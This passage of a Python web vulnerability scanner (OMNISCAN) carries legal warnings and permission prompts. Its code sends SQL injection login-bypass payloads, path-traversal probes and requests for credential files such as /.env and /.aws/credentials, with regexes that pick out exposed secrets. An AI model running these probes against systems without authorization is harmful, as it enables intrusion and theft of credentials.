                        for issue_type, issue_details in issues:
                            self.log_vulnerability(
                                issue_type,
                                test_url,
                                issue_details,
                                "CRITICAL",
                                f"Parameter: {param}, Payload: {payload[:30]}..."
                            )
                except Exception as e:
                    if self.verbose:
                        self.logger.log(f"Error testing SQLi at {test_url}: {e}", color=Fore.YELLOW)
        
        # Test login forms (serial for now due to session state)
        self.test_sqli_login()
    
    def test_sqli_login(self):
        """Test SQL injection in login forms"""
        login_endpoints = [ep for ep in self.discovered_endpoints 
                          if 'login' in ep['url'].lower() or 'auth' in ep['url'].lower()]
        
        for endpoint in login_endpoints[:5]:  # Limit to 5 login endpoints
            url = endpoint['url']
            
            # Test common SQLi payloads for login
            test_credentials = [
                {"username": "admin' OR '1'='1", "password": "anything"},
                {"username": "admin'--", "password": ""},
                {"username": "admin'#", "password": "test"},
                {"user": "admin' OR '1'='1", "pass": "anything"},
                {"email": "admin'@example.com'--", "password": "anything"},
                {"login": "admin' OR '1'='1", "password": "test123"},
                {"email": "admin' OR 1=1--", "passwd": "test"}
            ]
            
            for creds in test_credentials:
                try:
                    response = self.safe_request('POST', url, data=creds)
                    if response:
                        response_text = response.text.lower()
                        
                        # Check for successful login indicators
                        success_indicators = [
                            'dashboard', 'welcome', 'logout', 'profile',
                            'success', 'redirect', 'location:', '302',
                            'my account', 'account overview', 'main menu'
                        ]
                        
                        if any(indicator in response_text for indicator in success_indicators):
                            payload_used = list(creds.values())[0]
                            self.log_vulnerability(
                                "SQL Injection - Login Bypass",
                                url,
                                f"Possible authentication bypass",
                                "CRITICAL",
                                f"Payload: {payload_used[:40]}..., Credentials: {creds}, Response code: {response.status_code}"
                            )
                            break
                except Exception as e:
                    if self.verbose:
                        self.logger.log(f"Error testing login at {url}: {e}", color=Fore.YELLOW)
                    continue
    
    def test_path_traversal_single(self, test_data):
        """Test a single path traversal payload (for threading)"""
        param, payload, test_url = test_data
        
        response = self.safe_request('GET', test_url)
        if not response:
            return None
        
        response_text = response.text
        
        # Check for sensitive file contents
        sensitive_indicators = [
            ('root:', 'Linux /etc/passwd file entry'),
            ('daemon:', 'Linux /etc/passwd file entry'),
            ('bin:', 'Linux /etc/passwd file entry'),
            ('[boot loader]', 'Windows boot configuration'),
            ('[fonts]', 'Windows configuration file'),
            ('<?xml', 'XML declaration - possible config file'),
            ('<!DOCTYPE', 'XML/HTML doctype declaration'),
            ('Database error', 'Possible database error message'),
            ('SQLite', 'SQLite database file'),
            ('CREATE TABLE', 'SQL table creation statement'),
            ('INSERT INTO', 'SQL insert statement'),
            ('Apache', 'Apache configuration'),
            ('nginx', 'Nginx configuration'),
            ('server {', 'Nginx server block'),
            ('Directory of', 'Windows directory listing'),
            ('Volume in drive', 'Windows drive info')
        ]
        
        for indicator, file_type in sensitive_indicators:
            if indicator in response_text:
                return ("Path Traversal / LFI", f"Possible {file_type} accessed")
        
        return None
    
    def test_path_traversal(self):
        """Test for Path Traversal vulnerabilities with multi-threading"""
        self.logger.log("Testing for Path Traversal vulnerabilities with multi-threading...", color=Fore.CYAN)
        
        # Prepare test data
        test_params = ['file', 'page', 'load', 'doc', 'document', 'view', 'path',
                      'filename', 'image', 'img', 'pdf', 'download', 'resource',
                      'include', 'template', 'theme', 'skin']
        
        test_data = []
        for param in test_params:
            for payload in self.payloads['path_traversal'][:6]:
                test_url = f"{self.base_url}/?{param}={quote(payload)}"
                test_data.append((param, payload, test_url))
        
        # Use ThreadPoolExecutor for parallel testing
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit all tests
            future_to_test = {executor.submit(self.test_path_traversal_single, data): data 
                             for data in test_data}
            
            # Process results as they complete
            for future in as_completed(future_to_test):
                param, payload, test_url = future_to_test[future]
                try:
                    result = future.result()
                    if result:
                        issue_type, issue_details = result
                        self.log_vulnerability(
                            issue_type,
                            test_url,
                            issue_details,
                            "HIGH",
                            f"Parameter: {param}, Payload: {payload}"
                        )
                except Exception as e:
                    if self.verbose:
                        self.logger.log(f"Error testing path traversal at {test_url}: {e}", color=Fore.YELLOW)
    
    def test_info_disclosure_single(self, test_data):
        """Test a single file for information disclosure (for threading)"""
        file_path, description = test_data
        test_url = urljoin(self.base_url, file_path)
        
        response = self.safe_request('GET', test_url)
        if not response or response.status_code != 200:
            return None
        
        content = response.text
        
        # Check for sensitive information
        sensitive_patterns = [
            ('password', r'password\s*[:=]\s*[\'"]?[^\s\'"\n\r]+', 'Password exposure'),
            ('secret', r'secret\s*[:=]\s*[\'"]?[^\s\'"\n\r]+', 'Secret key exposure'),
            ('api_key', r'api[_-]?key\s*[:=]\s*[\'"]?[^\s\'"\n\r]+', 'API key exposure'),
            ('database', r'database\s*[:=]\s*[\'"]?[^\s\'"\n\r]+', 'Database credentials'),
            ('aws', r'aws_[a-z_]+?\s*[:=]\s*[\'"]?[^\s\'"\n\r]+', 'AWS credentials'),
            ('token', r'token\s*[:=]\s*[\'"]?[^\s\'"\n\r]+', 'Access token'),
            ('key', r'key\s*[:=]\s*[\'"]?[^\s\'"\n\r]+', 'Encryption/API key'),
            ('private', r'private[_-]?key\s*[:=]\s*[\'"]?[^\s\'"\n\r]+', 'Private key'),
            ('ssh', r'ssh[_-]', 'SSH key or configuration')
        ]
        
        for pattern_name, pattern, risk_desc in sensitive_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                return ("Information Disclosure", f"{description} contains {len(matches)} {pattern_name}(s)")
        
        return None
    
    def test_info_disclosure(self):
        """Test for Information Disclosure with multi-threading"""
        self.logger.log("Testing for Information Disclosure with multi-threading...", color=Fore.CYAN)
        
        # Prepare test data
        sensitive_files = [
            ('/.env', 'Environment configuration file'),
            ('/.git/config', 'Git configuration'),
            ('/config.php', 'PHP configuration'),
            ('/config.json', 'JSON configuration'),
            ('/.aws/credentials', 'AWS credentials'),
            ('/docker-compose.yml', 'Docker compose file'),
            ('/Dockerfile', 'Docker configuration'),
            ('/phpinfo.php', 'PHP info page'),
            ('/info.php', 'PHP information'),
            ('/test.php', 'Test page'),
            ('/debug.php', 'Debug page'),
            ('/package.json', 'Node.js package file'),
            ('/composer.json', 'PHP Composer file'),
            ('/pom.xml', 'Maven configuration'),
            ('/WEB-INF/web.xml', 'Java web application config'),
            ('/web.config', 'IIS configuration'),
            ('/.htaccess', 'Apache configuration'),
            ('/robots.txt', 'Robots exclusion file'),
            ('/sitemap.xml', 'Site map'),
            ('/crossdomain.xml', 'Cross-domain policy'),
            ('/client_secrets.json', 'OAuth client secrets'),
            ('/credentials.json', 'Application credentials'),
            ('/secrets.json', 'Application secrets'),
            ('/settings.py', 'Django settings'),
            ('/config/database.yml', 'Ruby on Rails database config'),
            ('/application.yml', 'Spring Boot configuration')
        ]
        
        # Use ThreadPoolExecutor for parallel testing
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit all tests
            future_to_test = {executor.submit(self.test_info_disclosure_single, data): data 
                             for data in sensitive_files}
            
            # Process results as they complete
            for future in as_completed(future_to_test):
                file_path, description = future_to_test[future]
                try:
                    result = future.result()
                    if result:
                        issue_type, issue_details = result
                        test_url = urljoin(self.base_url, file_path)
                        severity = "HIGH" if any(keyword in issue_details for keyword in ['password', 'secret', 'api_key', 'private']) else "MEDIUM"
                        self.log_vulnerability(
                            issue_type,
                            test_url,
                            issue_details,
                            severity,
                            f"File: {description}"
                        )
                except Exception as e:
                    if self.verbose:
                        self.logger.log(f"Error testing info disclosure at {file_path}: {e}", color=Fore.YELLOW)
    
    def test_http_methods(self):
        """Test potentially dangerous HTTP methods"""
        self.logger.log("Testing HTTP Methods...", color=Fore.CYAN)
        
        dangerous_methods = [
            ('PUT', 'Can upload/overwrite files'),
            ('DELETE', 'Can delete resources'),
            ('TRACE', 'Can be used for XST attacks'),
            ('CONNECT', 'Can proxy traffic'),
            ('PATCH', 'Can bypass validation'),
            ('OPTIONS', 'Can leak information'),
            ('PROPFIND', 'WebDAV - can leak directory info'),
            ('PROPPATCH', 'WebDAV - can modify properties'),
            ('MKCOL', 'WebDAV - can create collections'),
            ('COPY', 'WebDAV - can copy resources'),
            ('MOVE', 'WebDAV - can move resources'),
            ('LOCK', 'WebDAV - can lock resources'),
            ('UNLOCK', 'WebDAV - can unlock resources')
        ]
        
        for method, risk_desc in dangerous_methods:
            response = self.safe_request(method, self.base_url)
            if response:
                status_code = response.status_code
                content_length = len(response.content)
                
                if status_code in [200, 201, 204, 207]:  # Successful or partially successful
                    severity = "HIGH" if method in ['PUT', 'DELETE', 'TRACE', 'CONNECT'] else "MEDIUM"
                    
                    self.log_vulnerability(
                        "Potentially Dangerous HTTP Method",
                        self.base_url,
                        f"Method {method} allowed with status {status_code}",
                        severity,
                        f"Risk: {risk_desc}, Response size: {content_length} bytes"
                    )
    
    def run_comprehensive_test(self):
        """Run all security tests with multi-threading"""
        self.print_banner()
        
        self.logger.log("Starting comprehensive security assessment with multi-threading...", color=Fore.YELLOW)
        
        # Run discovery and analysis first
        self.discover_endpoints()
        self.analyze_technology()
        
        # Run vulnerability tests with multi-threading where applicable
        tests = [
            self.test_xss,
            self.test_sql_injection,
            self.test_path_traversal,
            self.test_info_disclosure,
            self.test_http_methods,
        ]
        
        self.logger.log(f"Running {len(tests)} vulnerability tests with multi-threading...", color=Fore.CYAN)
        
        for i, test in enumerate(tests, 1):
            test_name = test.__name__.replace('test_', '').replace('_', ' ').title()
            self.logger.log(f"[{i}/{len(tests)}] Testing: {test_name}", color=Fore.BLUE)
            try:
                test()
            except Exception as e:
                self.logger.log(f"Error in test {test_name}: {e}", color=Fore.RED)
                continue
        
        # Generate final report
        self.logger.log("Assessment complete!", color=Fore.GREEN)
        self.generate_report()
    
    def generate_report(self):
        """Generate comprehensive security report"""
        self.logger.log(f"\n{'='*80}", color=Fore.CYAN)
        self.logger.log("📊 OMNISCAN SECURITY REPORT - COMPLETE", color=Fore.YELLOW)
        self.logger.log(f"{'='*80}", color=Fore.CYAN)
        
        end_time = datetime.now()
        duration = end_time - self.start_time
        duration_str = str(duration).split('.')[0]  # Remove microseconds
        
        self.logger.log(f"🌐 Target URL: {self.base_url}", color=Fore.YELLOW)
        self.logger.log(f"⏱️  Start Time: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}", color=Fore.YELLOW)
        self.logger.log(f"⏱️  End Time: {end_time.strftime('%Y-%m-%d %H:%M:%S')}", color=Fore.YELLOW)
        self.logger.log(f"⏳ Duration: {duration_str}", color=Fore.YELLOW)
        self.logger.log(f"🔍 Endpoints Discovered: {len(self.discovered_endpoints)}", color=Fore.YELLOW)
        self.logger.log(f"⚠️  Vulnerabilities Found: {len(self.vulnerabilities)}", color=Fore.YELLOW)
        
        # Show technology stack
        if self.technologies:
            self.logger.log(f"🛠️  Technologies Detected: {', '.join(self.technologies[:5])}", color=Fore.YELLOW)
            if len(self.technologies) > 5:
                self.logger.log(f"   ... and {len(self.technologies) - 5} more", color=Fore.YELLOW)
        
        self.logger.log(f"{'-'*80}", color=Fore.CYAN)
        
        if not self.vulnerabilities:
            self.logger.log("✅ No vulnerabilities detected with basic tests.", color=Fore.GREEN)
            self.logger.log("⚠️  Note: This does NOT guarantee the target is secure!", color=Fore.YELLOW)
            self.logger.log(f"{'='*80}", color=Fore.CYAN)
            return
        
        # Group vulnerabilities by severity
        vuln_by_severity = {}
        for vuln in self.vulnerabilities:
            severity = vuln['severity']
            if severity not in vuln_by_severity:
                vuln_by_severity[severity] = []
            vuln_by_severity[severity].append(vuln)
        
        # Print summary by severity
        severity_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']
        self.logger.log("📋 VULNERABILITY SUMMARY:", color=Fore.YELLOW)
        for severity in severity_order:
            if severity in vuln_by_severity:
                count = len(vuln_by_severity[severity])
                color = {
                    'CRITICAL': Fore.RED + Style.BRIGHT,
                    'HIGH': Fore.RED,
                    'MEDIUM': Fore.YELLOW,
                    'LOW': Fore.GREEN,
                    'INFO': Fore.BLUE
                }.get(severity, Fore.WHITE)
                self.logger.log(f"  {severity}: {count}", color=color)
        
        self.logger.log(f"{'-'*80}", color=Fore.CYAN)
        
        # Print detailed vulnerabilities grouped by type
        vuln_by_type = {}
        for vuln in self.vulnerabilities:
            vuln_type = vuln['type']
            if vuln_type not in vuln_by_type:
                vuln_by_type[vuln_type] = []
            vuln_by_type[vuln_type].append(vuln)
        
        # Sort by severity within each type
        for vuln_type in vuln_by_type:
            vuln_by_type[vuln_type].sort(key=lambda x: ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'].index(x['severity']))
        
        # Print vulnerabilities
        self.logger.log("🔍 DETAILED FINDINGS:", color=Fore.YELLOW)
        for vuln_type, vulns in vuln_by_type.items():
            self.logger.log(f"\n📌 {vuln_type} ({len(vulns)} found):", color=Fore.MAGENTA)
            
            for vuln in vulns:
                severity_color = {
                    "CRITICAL": Fore.RED + Style.BRIGHT,
                    "HIGH": Fore.RED,
                    "MEDIUM": Fore.YELLOW,
                    "LOW": Fore.GREEN,
                    "INFO": Fore.BLUE
                }.get(vuln['severity'], Fore.WHITE)
                
                self.logger.log(f"  ▶ [{vuln['severity']}] {vuln['url']}", color=severity_color)
                self.logger.log(f"    📝 {vuln['details']}", color=Fore.WHITE)
                if vuln.get('extra_info'):
                    self.logger.log(f"    ℹ️  {vuln['extra_info']}", color=Fore.BLUE)
                self.logger.log(f"    ⏰ {vuln['timestamp']}", color=Fore.WHITE)
        
        self.logger.log(f"\n{'='*80}", color=Fore.CYAN)
        self.logger.log(f"📄 Report generated at: {end_time.strftime('%Y-%m-%d %H:%M:%S')}", color=Fore.GREEN)
        self.logger.log("     OMNISCAN v3.2 - Multi-threaded Security Scanner", color=Fore.YELLOW)
        self.logger.log(f"{'='*80}", color=Fore.CYAN)

def main():
    parser = argparse.ArgumentParser(
        description='OMNISCAN - Advanced Security Testing Tool - EDUCATIONAL USE ONLY',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Fore.RED}{'='*80}
{Fore.RED}⚠️  LEGAL WARNING: UNAUTHORIZED TESTING IS ILLEGAL ⚠️
{Fore.RED}{'='*80}
{Fore.YELLOW}This tool is for EDUCATIONAL and AUTHORIZED testing ONLY.
{Fore.YELLOW}You MUST have written permission to test the target.
{Fore.RED}{'='*80}

{Fore.GREEN}Examples:
  python omniscan.py -u http://testphp.vulnweb.com
  python omniscan.py -u example.com -O report.md --threads 20
  python omniscan.py -u https://api.test.com --delay 0.5 --threads 15 -v

{Fore.CYAN}Test on authorized environments only:
  • http://testphp.vulnweb.com/
  • https://demo.testfire.net/
  • http://dvwa.co.uk/
  • Systems you own or have written permission to test
        """
    )
    
    # Single URL argument
    parser.add_argument('-u', '--url', required=True,
                       help='Target URL to test (must be authorized). Automatically adds http:// if needed')
    
    parser.add_argument('--delay', type=float, default=0.1,
                       help='Delay between requests in seconds (default: 0.1)')
    parser.add_argument('--timeout', type=float, default=10.0,
                       help='Request timeout in seconds (default: 10.0)')
    parser.add_argument('--threads', type=int, default=10,
                       help='Number of threads for parallel scanning (default: 10)')
    parser.add_argument('-O', '--output', type=str,
                       help='Output file for report (saves ALL terminal output)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Process URL (automatically add protocol if missing)
    target_url = args.url
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
        print(f"{Fore.YELLOW}[*] Added http:// prefix to URL: {target_url}")
    
    # Display legal warning
    print(f"{Fore.RED}{'='*80}")
    print(f"{Fore.RED}    ⚠️   LEGAL AND ETHICAL USE ONLY   ⚠️")
    print(f"{Fore.RED}{'='*80}")
    print(f"{Fore.YELLOW}  You MUST have EXPLICIT WRITTEN PERMISSION")
    print(f"{Fore.YELLOW}  to test ANY website or API.")
    print(f"{Fore.RED}{'='*80}")
    print(f"{Fore.RED}  UNAUTHORIZED TESTING IS ILLEGAL AND CAN RESULT IN:")
    print(f"{Fore.YELLOW}  • Criminal charges (CFAA, Computer Misuse Act, etc.)")
    print(f"{Fore.YELLOW}  • Civil lawsuits for damages")
    print(f"{Fore.YELLOW}  • Imprisonment in some jurisdictions")
    print(f"{Fore.RED}{'='*80}")
    
    # Confirmation
    print(f"\n{Fore.WHITE}Target: {Fore.YELLOW}{target_url}")
    print(f"{Fore.WHITE}Threads: {Fore.YELLOW}{args.threads} | Delay: {Fore.YELLOW}{args.delay}s")
    if args.output:
        print(f"{Fore.WHITE}Output File: {Fore.YELLOW}{args.output}")
    
    confirm = input(f"\n{Fore.WHITE}Do you have WRITTEN PERMISSION to test this target? (yes/NO): ")
    if confirm.lower() != 'yes':
        print(f"{Fore.RED}Exiting. Only test with proper authorization.")
        sys.exit(1)
    
    # Additional confirmation for non-test sites
    test_sites = ['testphp.vulnweb.com', 'demo.testfire.net', 'dvwa.co.uk']
    if not any(test_site in target_url for test_site in test_sites):
        print(f"\n{Fore.YELLOW}⚠️  Warning: This doesn't appear to be a known test site.")
        confirm2 = input(f"{Fore.WHITE}Are you SURE you have permission? (yes/NO): ")
        if confirm2.lower() != 'yes':
            print(f"{Fore.RED}Exiting. Use authorized test sites only.")
            sys.exit(1)
    
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Create scanner and run tests
    scanner = OMNISCAN(
        target_url,
        delay=args.delay,
        timeout=args.timeout,
        output_file=args.output,
        verbose=args.verbose,
        threads=args.threads
    )
    
    try:
        scanner.run_comprehensive_test()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scanning interrupted by user")
        scanner.generate_report()
    except Exception as e:
        print(f"{Fore.RED}[!] Critical error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Install required packages if not present
    required_packages = ['requests', 'colorama']
    
    for package in required_packages:
        try:
            if package == 'colorama':
                from colorama import Fore, Style
            elif package == 'requests':
                import requests
        except ImportError:
            print(f"Installing required package: {package}")
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    
    # Re-import after installation
    from colorama import Fore, Style
    
    main()